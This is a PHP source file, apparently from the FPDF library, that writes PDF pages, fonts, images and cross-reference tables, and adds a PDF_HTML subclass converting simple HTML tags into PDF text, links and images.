	if($orientation!=$this->DefOrientation || $size[0]!=$this->DefPageSize[0] || $size[1]!=$this->DefPageSize[1])
		$this->PageSizes[$this->page] = array($this->wPt, $this->hPt);
}

function _endpage()
{
	$this->state = 1;
}

function _loadfont($font)
{
	// Load a font definition file from the font directory
			$a['type'] = 'Core';
			$a['name'] = 'Times-Roman';
			$a['up'] = -100;
			$a['ut'] = 50;
			$a['cw'] = array(
				chr(0)=>250,chr(1)=>250,chr(2)=>250,chr(3)=>250,chr(4)=>250,chr(5)=>250,chr(6)=>250,chr(7)=>250,chr(8)=>250,chr(9)=>250,chr(10)=>250,chr(11)=>250,chr(12)=>250,chr(13)=>250,chr(14)=>250,chr(15)=>250,chr(16)=>250,chr(17)=>250,chr(18)=>250,chr(19)=>250,chr(20)=>250,chr(21)=>250,
				chr(22)=>250,chr(23)=>250,chr(24)=>250,chr(25)=>250,chr(26)=>250,chr(27)=>250,chr(28)=>250,chr(29)=>250,chr(30)=>250,chr(31)=>250,' '=>250,'!'=>333,'"'=>408,'#'=>500,'$'=>500,'%'=>833,'&'=>778,'\''=>180,'('=>333,')'=>333,'*'=>500,'+'=>564,
				','=>250,'-'=>333,'.'=>250,'/'=>278,'0'=>500,'1'=>500,'2'=>500,'3'=>500,'4'=>500,'5'=>500,'6'=>500,'7'=>500,'8'=>500,'9'=>500,':'=>278,';'=>278,'<'=>564,'='=>564,'>'=>564,'?'=>444,'@'=>921,'A'=>722,
				'B'=>667,'C'=>667,'D'=>722,'E'=>611,'F'=>556,'G'=>722,'H'=>722,'I'=>333,'J'=>389,'K'=>722,'L'=>611,'M'=>889,'N'=>722,'O'=>722,'P'=>556,'Q'=>722,'R'=>667,'S'=>556,'T'=>611,'U'=>722,'V'=>722,'W'=>944,
				'X'=>722,'Y'=>722,'Z'=>611,'['=>333,'\\'=>278,']'=>333,'^'=>469,'_'=>500,'`'=>333,'a'=>444,'b'=>500,'c'=>444,'d'=>500,'e'=>444,'f'=>333,'g'=>500,'h'=>500,'i'=>278,'j'=>278,'k'=>500,'l'=>278,'m'=>778,
				'n'=>500,'o'=>500,'p'=>500,'q'=>500,'r'=>333,'s'=>389,'t'=>278,'u'=>500,'v'=>500,'w'=>722,'x'=>500,'y'=>500,'z'=>444,'{'=>480,'|'=>200,'}'=>480,'~'=>541,chr(127)=>350,chr(128)=>500,chr(129)=>350,chr(130)=>333,chr(131)=>500,
				chr(132)=>444,chr(133)=>1000,chr(134)=>500,chr(135)=>500,chr(136)=>333,chr(137)=>1000,chr(138)=>556,chr(139)=>333,chr(140)=>889,chr(141)=>350,chr(142)=>611,chr(143)=>350,chr(144)=>350,chr(145)=>333,chr(146)=>333,chr(147)=>444,chr(148)=>444,chr(149)=>350,chr(150)=>500,chr(151)=>1000,chr(152)=>333,chr(153)=>980,
				chr(154)=>389,chr(155)=>333,chr(156)=>722,chr(157)=>350,chr(158)=>444,chr(159)=>722,chr(160)=>250,chr(161)=>333,chr(162)=>500,chr(163)=>500,chr(164)=>500,chr(165)=>500,chr(166)=>200,chr(167)=>500,chr(168)=>333,chr(169)=>760,chr(170)=>276,chr(171)=>500,chr(172)=>564,chr(173)=>333,chr(174)=>760,chr(175)=>333,
				chr(176)=>400,chr(177)=>564,chr(178)=>300,chr(179)=>300,chr(180)=>333,chr(181)=>500,chr(182)=>453,chr(183)=>250,chr(184)=>333,chr(185)=>300,chr(186)=>310,chr(187)=>500,chr(188)=>750,chr(189)=>750,chr(190)=>750,chr(191)=>444,chr(192)=>722,chr(193)=>722,chr(194)=>722,chr(195)=>722,chr(196)=>722,chr(197)=>722,
				chr(198)=>889,chr(199)=>667,chr(200)=>611,chr(201)=>611,chr(202)=>611,chr(203)=>611,chr(204)=>333,chr(205)=>333,chr(206)=>333,chr(207)=>333,chr(208)=>722,chr(209)=>722,chr(210)=>722,chr(211)=>722,chr(212)=>722,chr(213)=>722,chr(214)=>722,chr(215)=>564,chr(216)=>722,chr(217)=>722,chr(218)=>722,chr(219)=>722,
				chr(220)=>722,chr(221)=>722,chr(222)=>556,chr(223)=>500,chr(224)=>444,chr(225)=>444,chr(226)=>444,chr(227)=>444,chr(228)=>444,chr(229)=>444,chr(230)=>667,chr(231)=>444,chr(232)=>444,chr(233)=>444,chr(234)=>444,chr(235)=>444,chr(236)=>278,chr(237)=>278,chr(238)=>278,chr(239)=>278,chr(240)=>500,chr(241)=>500,
				chr(242)=>500,chr(243)=>500,chr(244)=>500,chr(245)=>500,chr(246)=>500,chr(247)=>564,chr(248)=>500,chr(249)=>500,chr(250)=>500,chr(251)=>500,chr(252)=>500,chr(253)=>500,chr(254)=>500,chr(255)=>500);
	return $a;
}

function _escape($s)
{
	// Escape special characters in strings
	$s = str_replace('\\','\\\\',$s);
	$s = str_replace('(','\\(',$s);
	$s = str_replace(')','\\)',$s);
	$s = str_replace("\r",'\\r',$s);
	return $s;
}

function _textstring($s)
{
	// Format a text string
	return '('.$this->_escape($s).')';
}

function _UTF8toUTF16($s)
{
	// Convert UTF-8 to UTF-16BE with BOM
	$res = "\xFE\xFF";
	$nb = strlen($s);
	$i = 0;
	while($i<$nb)
	{
		$c1 = ord($s[$i++]);
		if($c1>=224)
		{
			// 3-byte character
			$c2 = ord($s[$i++]);
			$c3 = ord($s[$i++]);
			$res .= chr((($c1 & 0x0F)<<4) + (($c2 & 0x3C)>>2));
			$res .= chr((($c2 & 0x03)<<6) + ($c3 & 0x3F));
		}
		elseif($c1>=192)
		{
			// 2-byte character
			$c2 = ord($s[$i++]);
			$res .= chr(($c1 & 0x1C)>>2);
			$res .= chr((($c1 & 0x03)<<6) + ($c2 & 0x3F));
		}
		else
		{
			// Single-byte character
			$res .= "\0".chr($c1);
		}
	}
	return $res;
}

function _dounderline($x, $y, $txt)
{
	// Underline text
	$up = $this->CurrentFont['up'];
	$ut = $this->CurrentFont['ut'];
	$w = $this->GetStringWidth($txt)+$this->ws*substr_count($txt,' ');
	return sprintf('%.2F %.2F %.2F %.2F re f',$x*$this->k,($this->h-($y-$up/1000*$this->FontSize))*$this->k,$w*$this->k,-$ut/1000*$this->FontSizePt);
}

function _parsejpg($file)
{
	// Extract info from a JPEG file
	$a = getimagesize($file);
	if(!$a)
		$this->Error('Missing or incorrect image file: '.$file);
	if($a[2]!=2)
		$this->Error('Not a JPEG file: '.$file);
	if(!isset($a['channels']) || $a['channels']==3)
		$colspace = 'DeviceRGB';
	elseif($a['channels']==4)
		$colspace = 'DeviceCMYK';
	else
		$colspace = 'DeviceGray';
	$bpc = isset($a['bits']) ? $a['bits'] : 8;
	$data = file_get_contents($file);
	return array('w'=>$a[0], 'h'=>$a[1], 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'DCTDecode', 'data'=>$data);
}

function _parsepng($file)
{
	// Extract info from a PNG file
	$f = fopen($file,'rb');
	if(!$f)
		$this->Error('Can\'t open image file: '.$file);
	$info = $this->_parsepngstream($f,$file);
	fclose($f);
	return $info;
}

function _parsepngstream($f, $file)
{
	// Check signature
	if($this->_readstream($f,8)!=chr(137).'PNG'.chr(13).chr(10).chr(26).chr(10))
		$this->Error('Not a PNG file: '.$file);

	// Read header chunk
	$this->_readstream($f,4);
	if($this->_readstream($f,4)!='IHDR')
		$this->Error('Incorrect PNG file: '.$file);
	$w = $this->_readint($f);
	$h = $this->_readint($f);
	$bpc = ord($this->_readstream($f,1));
	if($bpc>8)
		$this->Error('16-bit depth not supported: '.$file);
	$ct = ord($this->_readstream($f,1));
	if($ct==0 || $ct==4)
		$colspace = 'DeviceGray';
	elseif($ct==2 || $ct==6)
		$colspace = 'DeviceRGB';
	elseif($ct==3)
		$colspace = 'Indexed';
	else
		$this->Error('Unknown color type: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown compression method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Unknown filter method: '.$file);
	if(ord($this->_readstream($f,1))!=0)
		$this->Error('Interlacing not supported: '.$file);
	$this->_readstream($f,4);
	$dp = '/Predictor 15 /Colors '.($colspace=='DeviceRGB' ? 3 : 1).' /BitsPerComponent '.$bpc.' /Columns '.$w;

	// Scan chunks looking for palette, transparency and image data
	$pal = '';
	$trns = '';
	$data = '';
	do
	{
		$n = $this->_readint($f);
		$type = $this->_readstream($f,4);
		if($type=='PLTE')
		{
			// Read palette
			$pal = $this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='tRNS')
		{
			// Read transparency info
			$t = $this->_readstream($f,$n);
			if($ct==0)
				$trns = array(ord(substr($t,1,1)));
			elseif($ct==2)
				$trns = array(ord(substr($t,1,1)), ord(substr($t,3,1)), ord(substr($t,5,1)));
			else
			{
				$pos = strpos($t,chr(0));
				if($pos!==false)
					$trns = array($pos);
			}
			$this->_readstream($f,4);
		}
		elseif($type=='IDAT')
		{
			// Read image data block
			$data .= $this->_readstream($f,$n);
			$this->_readstream($f,4);
		}
		elseif($type=='IEND')
			break;
		else
			$this->_readstream($f,$n+4);
	}
	while($n);

	if($colspace=='Indexed' && empty($pal))
		$this->Error('Missing palette in '.$file);
	$info = array('w'=>$w, 'h'=>$h, 'cs'=>$colspace, 'bpc'=>$bpc, 'f'=>'FlateDecode', 'dp'=>$dp, 'pal'=>$pal, 'trns'=>$trns);
	if($ct>=4)
	{
		// Extract alpha channel
		if(!function_exists('gzuncompress'))
			$this->Error('Zlib not available, can\'t handle alpha channel: '.$file);
		$data = gzuncompress($data);
		$color = '';
		$alpha = '';
		if($ct==4)
		{
			// Gray image
			$len = 2*$w;
			for($i=0;$i<$h;$i++)
			{
				$pos = (1+$len)*$i;
				$color .= $data[$pos];
				$alpha .= $data[$pos];
				$line = substr($data,$pos+1,$len);
				$color .= preg_replace('/(.)./s','$1',$line);
				$alpha .= preg_replace('/.(.)/s','$1',$line);
			}
		}
		else
		{
			// RGB image
			$len = 4*$w;
			for($i=0;$i<$h;$i++)
			{
				$pos = (1+$len)*$i;
				$color .= $data[$pos];
				$alpha .= $data[$pos];
				$line = substr($data,$pos+1,$len);
				$color .= preg_replace('/(.{3})./s','$1',$line);
				$alpha .= preg_replace('/.{3}(.)/s','$1',$line);
			}
		}
		unset($data);
		$data = gzcompress($color);
		$info['smask'] = gzcompress($alpha);
		if($this->PDFVersion<'1.4')
			$this->PDFVersion = '1.4';
	}
	$info['data'] = $data;
	return $info;
}

function _readstream($f, $n)
{
	// Read n bytes from stream
	$res = '';
	while($n>0 && !feof($f))
	{
		$s = fread($f,$n);
		if($s===false)
			$this->Error('Error while reading stream');
		$n -= strlen($s);
		$res .= $s;
	}
	if($n>0)
		$this->Error('Unexpected end of stream');
	return $res;
}

function _readint($f)
{
	// Read a 4-byte integer from stream
	$a = unpack('Ni',$this->_readstream($f,4));
	return $a['i'];
}

function _parsegif($file)
{
	// Extract info from a GIF file (via PNG conversion)
	if(!function_exists('imagepng'))
		$this->Error('GD extension is required for GIF support');
	if(!function_exists('imagecreatefromgif'))
		$this->Error('GD has no GIF read support');
	$im = imagecreatefromgif($file);
	if(!$im)
		$this->Error('Missing or incorrect image file: '.$file);
	imageinterlace($im,0);
	$f = @fopen('php://temp','rb+');
	if($f)
	{
		// Perform conversion in memory
		ob_start();
		imagepng($im);
		$data = ob_get_clean();
		imagedestroy($im);
		fwrite($f,$data);
		rewind($f);
		$info = $this->_parsepngstream($f,$file);
		fclose($f);
	}
	else
	{
		// Use temporary file
		$tmp = tempnam('.','gif');
		if(!$tmp)
			$this->Error('Unable to create a temporary file');
		if(!imagepng($im,$tmp))
			$this->Error('Error while saving to temporary file');
		imagedestroy($im);
		$info = $this->_parsepng($tmp);
		unlink($tmp);
	}
	return $info;
}

function _newobj()
{
	// Begin a new object
	$this->n++;
	$this->offsets[$this->n] = strlen($this->buffer);
	$this->_out($this->n.' 0 obj');
}

function _putstream($s)
{
	$this->_out('stream');
	$this->_out($s);
	$this->_out('endstream');
}

function _out($s)
{
	// Add a line to the document
	if($this->state==2)
		$this->pages[$this->page] .= $s."\n";
	else
		$this->buffer .= $s."\n";
}

function _putpages()
{
	$nb = $this->page;
	if(!empty($this->AliasNbPages))
	{
		// Replace number of pages
		for($n=1;$n<=$nb;$n++)
			$this->pages[$n] = str_replace($this->AliasNbPages,$nb,$this->pages[$n]);
	}
	if($this->DefOrientation=='P')
	{
		$wPt = $this->DefPageSize[0]*$this->k;
		$hPt = $this->DefPageSize[1]*$this->k;
	}
	else
	{
		$wPt = $this->DefPageSize[1]*$this->k;
		$hPt = $this->DefPageSize[0]*$this->k;
	}
	$filter = ($this->compress) ? '/Filter /FlateDecode ' : '';
	for($n=1;$n<=$nb;$n++)
	{
		// Page
		$this->_newobj();
		$this->_out('<</Type /Page');
		$this->_out('/Parent 1 0 R');
		if(isset($this->PageSizes[$n]))
			$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$this->PageSizes[$n][0],$this->PageSizes[$n][1]));
		$this->_out('/Resources 2 0 R');
		if(isset($this->PageLinks[$n]))
		{
			// Links
			$annots = '/Annots [';
			foreach($this->PageLinks[$n] as $pl)
			{
				$rect = sprintf('%.2F %.2F %.2F %.2F',$pl[0],$pl[1],$pl[0]+$pl[2],$pl[1]-$pl[3]);
				$annots .= '<</Type /Annot /Subtype /Link /Rect ['.$rect.'] /Border [0 0 0] ';
				if(is_string($pl[4]))
					$annots .= '/A <</S /URI /URI '.$this->_textstring($pl[4]).'>>>>';
				else
				{
					$l = $this->links[$pl[4]];
					$h = isset($this->PageSizes[$l[0]]) ? $this->PageSizes[$l[0]][1] : $hPt;
					$annots .= sprintf('/Dest [%d 0 R /XYZ 0 %.2F null]>>',1+2*$l[0],$h-$l[1]*$this->k);
				}
			}
			$this->_out($annots.']');
		}
		if($this->PDFVersion>'1.3')
			$this->_out('/Group <</Type /Group /S /Transparency /CS /DeviceRGB>>');
		$this->_out('/Contents '.($this->n+1).' 0 R>>');
		$this->_out('endobj');
		// Page content
		$p = ($this->compress) ? gzcompress($this->pages[$n]) : $this->pages[$n];
		$this->_newobj();
		$this->_out('<<'.$filter.'/Length '.strlen($p).'>>');
		$this->_putstream($p);
		$this->_out('endobj');
	}
	// Pages root
	$this->offsets[1] = strlen($this->buffer);
	$this->_out('1 0 obj');
	$this->_out('<</Type /Pages');
	$kids = '/Kids [';
	for($i=0;$i<$nb;$i++)
		$kids .= (3+2*$i).' 0 R ';
	$this->_out($kids.']');
	$this->_out('/Count '.$nb);
	$this->_out(sprintf('/MediaBox [0 0 %.2F %.2F]',$wPt,$hPt));
	$this->_out('>>');
	$this->_out('endobj');
}

function _putfonts()
{
	$nf = $this->n;
	foreach($this->diffs as $diff)
	{
		// Encodings
		$this->_newobj();
		$this->_out('<</Type /Encoding /BaseEncoding /WinAnsiEncoding /Differences ['.$diff.']>>');
		$this->_out('endobj');
	}
	foreach($this->FontFiles as $file=>$info)
	{
		// Font file embedding
		$this->_newobj();
		$this->FontFiles[$file]['n'] = $this->n;
		$font = file_get_contents($this->fontpath.$file,true);
		if(!$font)
			$this->Error('Font file not found: '.$file);
		$compressed = (substr($file,-2)=='.z');
		if(!$compressed && isset($info['length2']))
			$font = substr($font,6,$info['length1']).substr($font,6+$info['length1']+6,$info['length2']);
		$this->_out('<</Length '.strlen($font));
		if($compressed)
			$this->_out('/Filter /FlateDecode');
		$this->_out('/Length1 '.$info['length1']);
		if(isset($info['length2']))
			$this->_out('/Length2 '.$info['length2'].' /Length3 0');
		$this->_out('>>');
		$this->_putstream($font);
		$this->_out('endobj');
	}
	foreach($this->fonts as $k=>$font)
	{
		// Font objects
		$this->fonts[$k]['n'] = $this->n+1;
		$type = $font['type'];
		$name = $font['name'];
		if($type=='Core')
		{
			// Core font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /Type1');
			if($name!='Symbol' && $name!='ZapfDingbats')
				$this->_out('/Encoding /WinAnsiEncoding');
			$this->_out('>>');
			$this->_out('endobj');
		}
		elseif($type=='Type1' || $type=='TrueType')
		{
			// Additional Type1 or TrueType/OpenType font
			$this->_newobj();
			$this->_out('<</Type /Font');
			$this->_out('/BaseFont /'.$name);
			$this->_out('/Subtype /'.$type);
			$this->_out('/FirstChar 32 /LastChar 255');
			$this->_out('/Widths '.($this->n+1).' 0 R');
			$this->_out('/FontDescriptor '.($this->n+2).' 0 R');
			if(isset($font['diffn']))
				$this->_out('/Encoding '.($nf+$font['diffn']).' 0 R');
			else
				$this->_out('/Encoding /WinAnsiEncoding');
			$this->_out('>>');
			$this->_out('endobj');
			// Widths
			$this->_newobj();
			$cw = &$font['cw'];
			$s = '[';
			for($i=32;$i<=255;$i++)
				$s .= $cw[chr($i)].' ';
			$this->_out($s.']');
			$this->_out('endobj');
			// Descriptor
			$this->_newobj();
			$s = '<</Type /FontDescriptor /FontName /'.$name;
			foreach($font['desc'] as $k=>$v)
				$s .= ' /'.$k.' '.$v;
			if(!empty($font['file']))
				$s .= ' /FontFile'.($type=='Type1' ? '' : '2').' '.$this->FontFiles[$font['file']]['n'].' 0 R';
			$this->_out($s.'>>');
			$this->_out('endobj');
		}
		else
		{
			// Allow for additional types
			$mtd = '_put'.strtolower($type);
			if(!method_exists($this,$mtd))
				$this->Error('Unsupported font type: '.$type);
			$this->$mtd($font);
		}
	}
}

function _putimages()
{
	foreach(array_keys($this->images) as $file)
	{
		$this->_putimage($this->images[$file]);
		unset($this->images[$file]['data']);
		unset($this->images[$file]['smask']);
	}
}

function _putimage(&$info)
{
	$this->_newobj();
	$info['n'] = $this->n;
	$this->_out('<</Type /XObject');
	$this->_out('/Subtype /Image');
	$this->_out('/Width '.$info['w']);
	$this->_out('/Height '.$info['h']);
	if($info['cs']=='Indexed')
		$this->_out('/ColorSpace [/Indexed /DeviceRGB '.(strlen($info['pal'])/3-1).' '.($this->n+1).' 0 R]');
	else
	{
		$this->_out('/ColorSpace /'.$info['cs']);
		if($info['cs']=='DeviceCMYK')
			$this->_out('/Decode [1 0 1 0 1 0 1 0]');
	}
	$this->_out('/BitsPerComponent '.$info['bpc']);
	if(isset($info['f']))
		$this->_out('/Filter /'.$info['f']);
	if(isset($info['dp']))
		$this->_out('/DecodeParms <<'.$info['dp'].'>>');
	if(isset($info['trns']) && is_array($info['trns']))
	{
		$trns = '';
		for($i=0;$i<count($info['trns']);$i++)
			$trns .= $info['trns'][$i].' '.$info['trns'][$i].' ';
		$this->_out('/Mask ['.$trns.']');
	}
	if(isset($info['smask']))
		$this->_out('/SMask '.($this->n+1).' 0 R');
	$this->_out('/Length '.strlen($info['data']).'>>');
	$this->_putstream($info['data']);
	$this->_out('endobj');
	// Soft mask
	if(isset($info['smask']))
	{
		$dp = '/Predictor 15 /Colors 1 /BitsPerComponent 8 /Columns '.$info['w'];
		$smask = array('w'=>$info['w'], 'h'=>$info['h'], 'cs'=>'DeviceGray', 'bpc'=>8, 'f'=>$info['f'], 'dp'=>$dp, 'data'=>$info['smask']);
		$this->_putimage($smask);
	}
	// Palette
	if($info['cs']=='Indexed')
	{
		$filter = ($this->compress) ? '/Filter /FlateDecode ' : '';
		$pal = ($this->compress) ? gzcompress($info['pal']) : $info['pal'];
		$this->_newobj();
		$this->_out('<<'.$filter.'/Length '.strlen($pal).'>>');
		$this->_putstream($pal);
		$this->_out('endobj');
	}
}

function _putxobjectdict()
{
	foreach($this->images as $image)
		$this->_out('/I'.$image['i'].' '.$image['n'].' 0 R');
}

function _putresourcedict()
{
	$this->_out('/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]');
	$this->_out('/Font <<');
	foreach($this->fonts as $font)
		$this->_out('/F'.$font['i'].' '.$font['n'].' 0 R');
	$this->_out('>>');
	$this->_out('/XObject <<');
	$this->_putxobjectdict();
	$this->_out('>>');
}

function _putresources()
{
	$this->_putfonts();
	$this->_putimages();
	// Resource dictionary
	$this->offsets[2] = strlen($this->buffer);
	$this->_out('2 0 obj');
	$this->_out('<<');
	$this->_putresourcedict();
	$this->_out('>>');
	$this->_out('endobj');
}

function _putinfo()
{
	$this->_out('/Producer '.$this->_textstring('FPDF '.FPDF_VERSION));
	if(!empty($this->title))
		$this->_out('/Title '.$this->_textstring($this->title));
	if(!empty($this->subject))
		$this->_out('/Subject '.$this->_textstring($this->subject));
	if(!empty($this->author))
		$this->_out('/Author '.$this->_textstring($this->author));
	if(!empty($this->keywords))
		$this->_out('/Keywords '.$this->_textstring($this->keywords));
	if(!empty($this->creator))
		$this->_out('/Creator '.$this->_textstring($this->creator));
	$this->_out('/CreationDate '.$this->_textstring('D:'.@date('YmdHis')));
}

function _putcatalog()
{
	$this->_out('/Type /Catalog');
	$this->_out('/Pages 1 0 R');
	if($this->ZoomMode=='fullpage')
		$this->_out('/OpenAction [3 0 R /Fit]');
	elseif($this->ZoomMode=='fullwidth')
		$this->_out('/OpenAction [3 0 R /FitH null]');
	elseif($this->ZoomMode=='real')
		$this->_out('/OpenAction [3 0 R /XYZ null null 1]');
	elseif(!is_string($this->ZoomMode))
		$this->_out('/OpenAction [3 0 R /XYZ null null '.sprintf('%.2F',$this->ZoomMode/100).']');
	if($this->LayoutMode=='single')
		$this->_out('/PageLayout /SinglePage');
	elseif($this->LayoutMode=='continuous')
		$this->_out('/PageLayout /OneColumn');
	elseif($this->LayoutMode=='two')
		$this->_out('/PageLayout /TwoColumnLeft');
}

function _putheader()
{
	$this->_out('%PDF-'.$this->PDFVersion);
}

function _puttrailer()
{
	$this->_out('/Size '.($this->n+1));
	$this->_out('/Root '.$this->n.' 0 R');
	$this->_out('/Info '.($this->n-1).' 0 R');
}

function _enddoc()
{
	$this->_putheader();
	$this->_putpages();
	$this->_putresources();
	// Info
	$this->_newobj();
	$this->_out('<<');
	$this->_putinfo();
	$this->_out('>>');
	$this->_out('endobj');
	// Catalog
	$this->_newobj();
	$this->_out('<<');
	$this->_putcatalog();
	$this->_out('>>');
	$this->_out('endobj');
	// Cross-ref
	$o = strlen($this->buffer);
	$this->_out('xref');
	$this->_out('0 '.($this->n+1));
	$this->_out('0000000000 65535 f ');
	for($i=1;$i<=$this->n;$i++)
		$this->_out(sprintf('%010d 00000 n ',$this->offsets[$i]));
	// Trailer
	$this->_out('trailer');
	$this->_out('<<');
	$this->_puttrailer();
	$this->_out('>>');
	$this->_out('startxref');
	$this->_out($o);
	$this->_out('%%EOF');
	$this->state = 3;
}
// End of class
}

function hex2dec($couleur = "#000000"){
    $R = substr($couleur, 1, 2);
    $rouge = hexdec($R);
    $V = substr($couleur, 3, 2);
    $vert = hexdec($V);
    $B = substr($couleur, 5, 2);
    $bleu = hexdec($B);
    $tbl_couleur = array();
    $tbl_couleur['R']=$rouge;
    $tbl_couleur['V']=$vert;
    $tbl_couleur['B']=$bleu;
    return $tbl_couleur;
}

//conversion pixel -> millimeter at 72 dpi
function px2mm($px){
    return $px*25.4/72;
}

function txtentities($html){
    $trans = get_html_translation_table(HTML_ENTITIES);
    $trans = array_flip($trans);
    return strtr($html, $trans);
}
////////////////////////////////////

class PDF_HTML extends FPDF
{
//variables of html parser
var $B;
var $I;
var $U;
var $HREF;
var $fontList;
var $issetfont;
var $issetcolor;

function PDF_HTML($orientation='P', $unit='mm', $format='A4')
{
    //Call parent constructor
    $this->FPDF($orientation,$unit,$format);
    //Initialization
    $this->B=0;
    $this->I=0;
    $this->U=0;
    $this->HREF='';
    $this->fontlist=array('arial', 'times', 'courier', 'helvetica', 'symbol');
    $this->issetfont=false;
    $this->issetcolor=false;
}

function WriteHTML($html)
{
    //HTML parser
    $html=strip_tags($html,"<b><u><i><a><img><p><br><strong><em><font><tr><blockquote>"); //supprime tous les tags sauf ceux reconnus
    $html=str_replace("\n",' ',$html); //remplace retour à la ligne par un espace
    $a=preg_split('/<(.*)>/U',$html,-1,PREG_SPLIT_DELIM_CAPTURE); //éclate la chaîne avec les balises
    foreach($a as $i=>$e)
    {
        if($i%2==0)
        {
            //Text
            if($this->HREF)
                $this->PutLink($this->HREF,$e);
            else
                $this->Write(5,stripslashes(txtentities($e)));
        }
        else
        {
            //Tag
            if($e[0]=='/')
                $this->CloseTag(strtoupper(substr($e,1)));
            else
            {
                //Extract attributes
                $a2=explode(' ',$e);
                $tag=strtoupper(array_shift($a2));
                $attr=array();
                foreach($a2 as $v)
                {
                    if(preg_match('/([^=]*)=["\']?([^"\']*)/',$v,$a3))
                        $attr[strtoupper($a3[1])]=$a3[2];
                }
                $this->OpenTag($tag,$attr);
            }
        }
    }
}

function OpenTag($tag, $attr)
{
    //Opening tag
    switch($tag){
        case 'STRONG':
            $this->SetStyle('B',true);
            break;
        case 'EM':
            $this->SetStyle('I',true);
            break;
        case 'B':
        case 'I':
        case 'U':
            $this->SetStyle($tag,true);
            break;
        case 'A':
            $this->HREF=$attr['HREF'];
            break;
        case 'IMG':
            if(isset($attr['SRC']) && (isset($attr['WIDTH']) || isset($attr['HEIGHT']))) {
                if(!isset($attr['WIDTH']))
                    $attr['WIDTH'] = 0;
                if(!isset($attr['HEIGHT']))
                    $attr['HEIGHT'] = 0;
                $this->Image($attr['SRC'], $this->GetX(), $this->GetY(), px2mm($attr['WIDTH']), px2mm($attr['HEIGHT']));
            }
            break;
        case 'TR':
        case 'BLOCKQUOTE':
        case 'BR':
            $this->Ln(5);
            break;
        case 'P':
            $this->Ln(10);
            break;
        case 'FONT':
            if (isset($attr['COLOR']) && $attr['COLOR']!='') {
                $coul=hex2dec($attr['COLOR']);
                $this->SetTextColor($coul['R'],$coul['V'],$coul['B']);
                $this->issetcolor=true;
            }
            if (isset($attr['FACE']) && in_array(strtolower($attr['FACE']), $this->fontlist)) {
                $this->SetFont(strtolower($attr['FACE']));
                $this->issetfont=true;
            }
            break;
    }
}

function CloseTag($tag)
{
    //Closing tag
    if($tag=='STRONG')
        $tag='B';
    if($tag=='EM')
        $tag='I';
    if($tag=='B' || $tag=='I' || $tag=='U')
        $this->SetStyle($tag,false);
    if($tag=='A')
        $this->HREF='';
    if($tag=='FONT'){
        if ($this->issetcolor==true) {
            $this->SetTextColor(0);
        }
        if ($this->issetfont) {
            $this->SetFont('arial');
            $this->issetfont=false;
        }
    }
}

function SetStyle($tag, $enable)
{
    //Modify style and select corresponding font
    $this->$tag+=($enable ? 1 : -1);
    $style='';
    foreach(array('B','I','U') as $s)
    {
        if($this->$s>0)
            $style.=$s;
    }
    $this->SetFont('',$style);
}

function PutLink($URL, $txt)
{
    //Put a hyperlink
    $this->SetTextColor(0,0,255);
    $this->SetStyle('U',true);
    $this->Write(5,$txt,$URL);
    $this->SetStyle('U',false);
    $this->SetTextColor(0);
}

}//end of class
?>